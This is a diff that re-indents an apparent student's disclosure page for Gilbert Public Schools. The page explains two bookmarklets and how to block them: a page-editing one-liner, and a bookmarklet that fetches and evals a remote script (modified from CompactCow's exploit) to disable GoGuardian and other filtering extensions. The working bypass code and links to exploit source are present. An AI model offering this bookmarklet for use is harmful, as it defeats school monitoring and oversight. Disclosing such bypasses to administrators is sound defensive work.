@@ -11,71 +11,70 @@
 
 <body>
     <div class="main">
-    <h1>Bookmarlet information</h1>
-    <p>
-        Bookmarklets are pieces of javascript that are ran as a bookmark,
-        some popular bookmarklets are below. These are hosted on 
-        this site for the use of reporting them and will not be
-        shared. To use these bookmarklets, drag them to your 
-        bookmarks, for the web page editing you can just click
-        it on any page to enable editing. On the disable extensions
-        bookmarklet, you must click it once on this site, once you
-        are sent to the chrome webstore you click it again and you
-        will be presented with toggles with all extensions visible.
-        The scripts have an alert window with a disclaimer, just
-        click OK to continue running the script.
-        <ul>
-            <li><a href="javascript:function confirmbox(){confirm('This script is only meant to be used for reporting purposes to Gilbert Public Schools, not for student use. Click OK to continue running script. This will work on any site.')?(document.body.contentEditable='true',document.designMode='on',window.alert('Script has been run. Click anywhere to edit text')):window.alert('Script Terminated')}confirmbox();">Enable page editing</a></li>
-            <li><a href="javascript:fetch(&quot;https://kevintopete.com/reporting/bookmarklets/js/disable_extension.js&quot;).then(data=>{data.text().then(text=>{eval(text)})});">Modified CompactCow disable extensions</a></li>
-        </ul>
-        The disable extensions bookmarklet is especially dangerous as it 
-        allows disabling of Goguardian and the other filtering plugins. 
-        This particular bookmarlet is already being looked at by 
-        Goguardian and Google respectively.
-        <br><br>
-        The disable extension script is made by CompactCow and modified
-        to add the disclaimer, the original instructions can be found
-        on their site <a href="https://compactcow.com/ltbeef/">here</a> this is blocked by default but anyone can
-        just put the script on another site as seen here. The full
-        script source can be found <a href="https://compactcow.com/ltbeef/exploit.js">here</a> and mine can be found <a href="https://kevintopete.com/reporting/bookmarklets/js/disable_extension.js">here</a>.
-        along with that <a href="https://fognetwork.github.io/Ingot">Ingot</a> is a similar script just wtih a nicer
-        user interface, but seems that GG has been successful in
-        restricting the webstore url they use while Compactcow
-        is using a randomly generated one looking at the script.
-        Lastly the web editing script can be found <a href="https://kevintopete.com/reporting/bookmarklets/js/enable_page_editing.js">here</a>. The
-        bookmarklet above just has the script as a one liner
-        instead of a fetch due to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a> restrictions in place by
-        most sites.
-        <br><br>
-        Currently theres no direct fix for this, only partial fixes
-        one that will fix one liner bookmarklets such as the web
-        page editing one can be done by taking the following steps
-        in Google Admin Console:
-        <ol>
-            <li>Sign in to Google Admin Console</li>
-            <li>Go to <a href="https://admin.google.com/ac/chrome/settings/user">Devices > Chrome > Settings</a>.</li>
-            <li>Select the OU group the students are in on the left</li>
-            <li>Scroll to <b>URL blocking</b>.</li>
-            <li>Add the line <i>javascript://*</i></li>
-        </ol>
-        There is currently one fix when it comes to bookmarklets
-        which fetch their script such as the one to disable
-        extensions, this is to use chrome v106 as google has
-        implemented a fix to the management api the chrome
-        webstore uses rending these scripts useless.
-        <br><br>
-        one liner / local bookmarklet fix sourced from: <a href="https://xfanatical.com/blog/block-student-bookmarklets">Xfanatical</a>
-        <br><br>
-        Any questions that you may have you may contact me at:
-        <ul>
-            <li>School Email: kjtopete@gilbertschools.net</li>
-            <li>Personal Email: me@kevintopete.com</li>
-        </ul>
-
-        p.s sorry for lack of any styling on the page, this was spun up very quickly :)
-        <br><br>
-        <a href="https://kevintopete.com/reporting/">Return to bypasses page</a>
-    </p>
+        <h1>Bookmarlet information</h1>
+        <p>
+            Bookmarklets are pieces of javascript that are ran as a bookmark,
+            some popular bookmarklets are below. These are hosted on 
+            this site for the use of reporting them and will not be
+            shared. To use these bookmarklets, drag them to your 
+            bookmarks, for the web page editing you can just click
+            it on any page to enable editing. On the disable extensions
+            bookmarklet, you must click it once on this site, once you
+            are sent to the chrome webstore you click it again and you
+            will be presented with toggles with all extensions visible.
+            The scripts have an alert window with a disclaimer, just
+            click OK to continue running the script.
+            <ul>
+                <li><a href="javascript:function confirmbox(){confirm('This script is only meant to be used for reporting purposes to Gilbert Public Schools, not for student use. Click OK to continue running script. This will work on any site.')?(document.body.contentEditable='true',document.designMode='on',window.alert('Script has been run. Click anywhere to edit text')):window.alert('Script Terminated')}confirmbox();">Enable page editing</a></li>
+                <li><a href="javascript:fetch(&quot;https://kevintopete.com/reporting/bookmarklets/js/disable_extension.js&quot;).then(data=>{data.text().then(text=>{eval(text)})});">Modified CompactCow disable extensions</a></li>
+            </ul>
+            The disable extensions bookmarklet is especially dangerous as it 
+            allows disabling of Goguardian and the other filtering plugins. 
+            This particular bookmarlet is already being looked at by 
+            Goguardian and Google respectively.
+            <br><br>
+            The disable extension script is made by CompactCow and modified
+            to add the disclaimer, the original instructions can be found
+            on their site <a href="https://compactcow.com/ltbeef/">here</a> this is blocked by default but anyone can
+            just put the script on another site as seen here. The full
+            script source can be found <a href="https://compactcow.com/ltbeef/exploit.js">here</a> and mine can be found <a href="https://kevintopete.com/reporting/bookmarklets/js/disable_extension.js">here</a>.
+            along with that <a href="https://fognetwork.github.io/Ingot">Ingot</a> is a similar script just wtih a nicer
+            user interface, but seems that GG has been successful in
+            restricting the webstore url they use while Compactcow
+            is using a randomly generated one looking at the script.
+            Lastly the web editing script can be found <a href="https://kevintopete.com/reporting/bookmarklets/js/enable_page_editing.js">here</a>. The
+            bookmarklet above just has the script as a one liner
+            instead of a fetch due to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a> restrictions in place by
+            most sites.
+            <br><br>
+            Currently theres no direct fix for this, only partial fixes
+            one that will fix one liner bookmarklets such as the web
+            page editing one can be done by taking the following steps
+            in Google Admin Console:
+            <ol>
+                <li>Sign in to Google Admin Console</li>
+                <li>Go to <a href="https://admin.google.com/ac/chrome/settings/user">Devices > Chrome > Settings</a>.</li>
+                <li>Select the OU group the students are in on the left</li>
+                <li>Scroll to <b>URL blocking</b>.</li>
+                <li>Add the line <i>javascript://*</i></li>
+            </ol>
+            There is currently one fix when it comes to bookmarklets
+            which fetch their script such as the one to disable
+            extensions, this is to use chrome v106 as google has
+            implemented a fix to the management api the chrome
+            webstore uses rending these scripts useless.
+            <br><br>
+            one liner / local bookmarklet fix sourced from: <a href="https://xfanatical.com/blog/block-student-bookmarklets">Xfanatical</a>
+            <br><br>
+            Any questions that you may have you may contact me at:
+            <ul>
+                <li>School Email: kjtopete@gilbertschools.net</li>
+                <li>Personal Email: me@kevintopete.com</li>
+            </ul>
+            p.s sorry for lack of any styling on the page, this was spun up very quickly :)
+            <br><br>
+            <a href="https://kevintopete.com/reporting/">Return to bypasses page</a>
+        </p>
     </div>
 </body>
 
